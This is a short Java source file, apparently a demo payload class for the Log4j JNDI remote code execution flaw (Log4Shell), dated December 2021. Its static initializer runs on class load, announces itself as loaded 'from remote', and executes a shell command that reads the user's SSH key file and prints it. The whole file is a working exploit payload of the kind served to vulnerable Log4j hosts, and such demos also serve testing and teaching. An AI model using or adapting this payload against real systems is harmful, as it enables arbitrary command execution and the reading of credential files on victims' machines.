package com.yangxvhao.demo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * @author yangxuhao on 2021-12-13.
 */
public class Log4jRCE {
  static {
    System.out.println("I am Log4jRCE from remote!!!");
    Process p;
    String [] cmd = {"cat", "/Users/MAC/.ssh/id_rsa.pub"};
    try {
      p = java.lang.Runtime.getRuntime().exec(cmd);
      InputStream fis = p.getInputStream();
      InputStreamReader isr = new InputStreamReader(fis);
      BufferedReader br = new BufferedReader(isr);
      String line = null;
      while((line=br.readLine())!=null) {
        System.out.println(line);
      }
    }
    catch (IOException e) {
      e.printStackTrace();
    }
  }
}
